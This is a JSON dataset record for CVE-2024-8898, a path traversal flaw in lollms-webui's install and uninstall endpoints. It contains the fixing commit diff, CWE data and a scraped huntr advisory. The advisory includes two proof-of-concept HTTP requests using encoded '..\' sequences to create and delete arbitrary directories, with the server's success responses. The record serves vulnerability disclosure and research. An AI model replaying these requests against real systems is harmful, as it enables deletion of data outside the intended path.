{
    "CVE-2024-8898": {
        "published_date": "2025-03-20T10:10:58.125Z",
        "patch_commits": [
            {
                "url": "https://github.com/parisneo/lollms-webui/commit/6d07c8a0dd0a15cc060becc73fda9fe8e788eb23",
                "content": "fixed  sanitization lack in apps zoo\n\nFilename: endpoints/lollms_apps.py:\n```\n@@ -339,6 +339,8 @@\ndef get_current_conda_env():\n @router.post(\"/install/{app_name}\")\n async def install_app(app_name: str, auth: AuthRequest):\n     check_access(lollmsElfServer, auth.client_id)\n+    app_name=sanitize_path(app_name)\n+\n     REPO_DIR = lollmsElfServer.lollms_paths.personal_path/\"apps_zoo_repo\"\n     \n     # Create the app directory\n\n@@ -410,6 +412,7 @@\nasync def install_app(app_name: str, auth: AuthRequest):\n \n @router.post(\"/uninstall/{app_name}\")\n async def uninstall_app(app_name: str, auth: AuthRequest):\n+    app_name=sanitize_path(app_name)\n     app_path = lollmsElfServer.lollms_paths.apps_zoo_path / app_name\n     if app_path.exists():\n         shutil.rmtree(app_path)\n\n@@ -486,6 +489,8 @@\ndef load_apps_data():\n \n @router.get(\"/lollms_assets/{asset_type}/{file_name}\")\n async def lollms_assets(asset_type: str, file_name: str):\n+    asset_type = sanitize_path(asset_type)\n+    file_name = sanitize_path(file_name)\n     # Define the base path\n     base_path = Path(__file__).parent\n```"
            }
        ],
        "sw_version": "v9.8",
        "sw_version_wget": "https://github.com/parisneo/lollms-webui/archive/refs/tags/v9.8.zip",
        "description": "A path traversal vulnerability exists in the `install` and `uninstall` API endpoints of parisneo/lollms-webui version V12 (Strawberry). This vulnerability allows attackers to create or delete directories with arbitrary paths on the system. The issue arises due to insufficient sanitization of user-supplied input, which can be exploited to traverse directories outside the intended path.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/6072371f-0ddc-42e3-9207-1c6d6b18d32f",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nCreate and delete any folder in the system in parisneo/lollms-webui\nValid\nReported on Sep 6th 2024\nDescription\nHi, I found Path Traversal error occurring in 2 api:\ninstall: Allows attackers to create directories with arbitrary paths on the system\nuninstall: Allows attacker to delete any directory on the system.\n@router.post(\"/install/{app_name}\")\nasync def install_app(app_name: str, auth: AuthRequest):\n    check_access(lollmsElfServer, auth.client_id)\n    REPO_DIR = lollmsElfServer.lollms_paths.personal_path/\"apps_zoo_repo\"\n    \n    # Create the app directory\n    app_path = lollmsElfServer.lollms_paths.apps_zoo_path/app_name\n    os.makedirs(app_path, exist_ok=True)\n\n    source_dir = REPO_DIR/app_name\n    \n    if not source_dir.exists():\n        raise HTTPException(status_code=404, detail=f\"App {app_name} not found in the local repository\")\n\n    # Define directories to exclude\n    exclude_dirs = {'.vscode', '.git'}\n\n    # Copy all files and directories, excluding the ones in exclude_dirs\n    for item in source_dir.glob('*'):\n        if item.is_dir():\n            if item.name not in exclude_dirs:\n                shutil.copytree(item, app_path/item.name, dirs_exist_ok=True)\n        else:\n            shutil.copy2(item, app_path)\n\n    return {\"message\": f\"App {app_name} installed successfully.\"}\n\n@router.post(\"/uninstall/{app_name}\")\nasync def uninstall_app(app_name: str, auth: AuthRequest):\n    app_path = lollmsElfServer.lollms_paths.apps_zoo_path / app_name\n    if app_path.exists():\n        shutil.rmtree(app_path)\n        return {\"message\": f\"App {app_name} uninstalled successfully.\"}\n    else:\n        raise HTTPException(status_code=404, detail=\"App not found\")\nProof of Concept\nPoc - Create any folder on the system\nHTTP Request\nPOST /install/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5chainguyen0207 HTTP/1.1\nHost: localhost:9600\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json\nContent-Length: 36\nOrigin: http://localhost:9600\nConnection: keep-alive\nReferer: http://localhost:9600/apps_view/\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\n\n{\"client_id\":\"m3NVWgXc8ne53EKjAAAD\"}\nHTTP Response\nHTTP/1.1 200 OK\ndate: Fri, 06 Sep 2024 12:51:44 GMT\nserver: uvicorn\ncontent-length: 87\ncontent-type: application/json\naccess-control-allow-credentials: true\naccess-control-allow-origin: http://localhost:9600\nvary: Origin\n\n{\"message\":\"App ..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\hainguyen0207 installed successfully.\"}\nPoc - Delete any folder on the system\nHTTP Resquest\nPOST /uninstall/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctest\\ HTTP/1.1\nHost: localhost:9600\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/json\nContent-Length: 36\nOrigin: http://localhost:9600\nConnection: keep-alive\nReferer: http://localhost:9600/apps_view/\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\n\n{\"client_id\":\"m3NVWgXc8ne53EKjAAAD\"}\nHTTP Response\nHTTP/1.1 200 OK\ndate: Fri, 06 Sep 2024 12:50:25 GMT\nserver: uvicorn\ncontent-length: 82\ncontent-type: application/json\naccess-control-allow-credentials: true\naccess-control-allow-origin: http://localhost:9600\nvary: Origin\n\n{\"message\":\"App ..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\test\\\\ uninstalled successfully.\"}\nImpact\nAllows attackers to create, delete directories with arbitrary paths on the system\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.8 months ago\nhuntr-helpermodified the Severity from Critical (9.4) to Critical (9.1)8 months ago\nHaiNguyen\ncommented8 months ago\nResearcher\nHi, the vulnerability has been fixed in commit:\nhttps://github.com/ParisNeo/lollms-webui/commit/6d07c8a0dd0a15cc060becc73fda9fe8e788eb23\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nEthan Silvasmodified the Severity from Critical (9.1) to Medium (6.7)8 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nEthan Silvas validated this vulnerability8 months ago\nWorked with maintainer to decide 1 fix = 1 CVE and is the same as https://huntr.com/bounties/2091c67b-e622-4152-ae67-5be130edfdd6. I have adjusted the CVSS to account for the worst case of file read as mentioned in the other report, the attack vector as local because lollms is not designed to be run remotely, and the privileges as high because it requires guessing session IDs which are changed every time the user loads a tab.\nhainguyen0207has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-8898assigned to this report.8 months ago\nEthan Silvasmarked this as fixedin V12with commit6d07c88 months ago\nSaifeddine ALOUIhas been awarded the fix bounty\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hours5 months ago\nThis vulnerability has now been published5 months ago\nCVE-2024-8898has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-8898\n(Published)\nVulnerability Type\nCWE-22: Path Traversal\nSeverity\nMedium (6.7)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nV12 (Strawberry)\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$75\nFix Bounty\n$18.75\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes two proof-of-concept HTTP request examples demonstrating the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ]
    }
}